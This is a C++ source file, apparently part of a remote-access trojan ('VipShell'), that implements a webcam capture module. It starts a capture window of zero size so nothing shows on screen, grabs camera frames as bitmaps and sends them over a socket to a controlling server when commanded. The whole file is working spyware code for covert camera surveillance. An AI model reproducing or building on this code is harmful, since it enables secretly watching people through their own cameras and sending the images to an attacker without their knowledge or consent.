#include ".\getcappictureproc.h"

CGetCapPictureProc* g_hCap = NULL;
CGetCapPictureProc::CGetCapPictureProc(void)
{
	RECT rc;
	rc.left = 0;
	rc.top = 0;
	rc.right = 0;
	rc.bottom = 0;
	hGetCap.Start(L"GetCap", &rc);

}

CGetCapPictureProc::~CGetCapPictureProc(void)
{
	hGetCap.Stop();
	Sleep(10000);
	g_hCap = NULL;
}


void CGetCapPictureProc::OnCmd_GetDoWork(tagVipShellCmd* info)
{
	tagVipShellCmd SendInfo;
	SendInfo.dwCmd = 3; 
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
}


void CGetCapPictureProc::OnGetCap(tagVipShellCmd* info)
{
	g_hCap = this;
	for(int i = 0; i < 100; i++)
	{
		Sleep(100);
		if( hGetCap.IsOpen() )
			break;

	}
	if(i == 100)
	{
		tagVipShellCmd SendInfo;
		//失败
		SendInfo.dwCmd = CMD_ERROR;
		m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
		return ;
	}
	while(m_hServer->IsOpened())
	{
		Sleep(1000);
	}
}
bool CGetCapPictureProc::SendData()
{
	tagVipShellCmd SendInfo;
	DWORD dwLzw = 0;
	DWORD dwLen = 0;
	BYTE* bBuf = NULL;
	hGetCap.GetCapDataBuff(NULL, &dwLen, &bBuf, &dwLzw);
	if( bBuf == 0 || dwLzw == 0 || dwLen == 0)
	{

		//失败
		SendInfo.dwCmd = CMD_ERROR;
		m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
		return false;
	}

	SendInfo.dwCmd = CMD_ISOK;
	SendInfo.dw1 = dwLzw;
	SendInfo.dw2 = dwLen;
	m_hServer->Send(&SendInfo, sizeof(tagVipShellCmd));
	int nRet = m_hServer->Recv(&SendInfo, sizeof(tagVipShellCmd));
	if( nRet == SOCKET_ERROR || nRet == 0)
	{
		m_hServer->Close();
		return false;
	}
	//传给连接
	nRet = _SendBuffData(bBuf, dwLzw);
	if( nRet == SOCKET_ERROR)
		m_hServer->Close();	
	nRet = m_hServer->Recv(&SendInfo, sizeof(tagVipShellCmd));
	if( nRet == SOCKET_ERROR || nRet == 0)
	{
		m_hServer->Close();
		return false;
	}
	return true;
}
LRESULT CGetCapData::FrameCallBack(HWND hWnd, LPVIDEOHDR lpVHdr)
{
	BITMAPFILEHEADER bmfHdr;
	bmfHdr.bfType = 0x4D42; // "BM"
	DWORD dwDIBSize = sizeof(BITMAPFILEHEADER) + lpVHdr->dwBufferLength;
	bmfHdr.bfSize = dwDIBSize;
	bmfHdr.bfReserved1 = 0;
	bmfHdr.bfReserved2 = 0;
	bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);

	static BYTE pdata[256];
	LPBITMAPINFO lpbi;
	DWORD dwSize;
	dwSize = capGetVideoFormatSize(hWnd);
	lpbi = (LPBITMAPINFO)pdata;
	capGetVideoFormat(hWnd, lpbi, dwSize); 
	DWORD dwDatelen;
	dwDatelen = dwSize + sizeof(BITMAPFILEHEADER) + lpVHdr->dwBufferLength;
	BYTE* pSendDate = __NewBuff(dwDatelen);
	memcpy(pSendDate, &bmfHdr, sizeof(BITMAPFILEHEADER));
	memcpy(pSendDate + sizeof(BITMAPFILEHEADER), lpbi, dwSize);
	memcpy(pSendDate + sizeof(BITMAPFILEHEADER) + dwSize, lpVHdr->lpData, lpVHdr->dwBufferLength);
	if( g_hCap )
		g_hCap->SendData();
	return 0;
}